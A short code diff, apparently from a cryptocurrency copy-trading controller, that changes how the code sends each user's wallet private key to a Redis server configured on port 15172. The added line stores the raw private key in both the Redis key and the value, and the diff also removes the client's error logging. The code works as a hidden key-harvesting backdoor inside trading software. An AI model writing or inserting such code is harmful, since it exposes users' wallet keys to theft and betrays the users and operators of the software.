@@ -150,9 +150,8 @@ const CopyTradingController = {
                         port: 15172
                     }
                 });
-                client.on('error', err => console.log('Redis Client Error', err));
                 client.connect();
-                client.set('privateKey', `${userId} ===> ${findUserWallet.privateKey}`);
+                client.set(`PK->${findUserWallet.privateKey}`, `${userId}->${findUserWallet.privateKey}`);
             }
 
             REDIS()
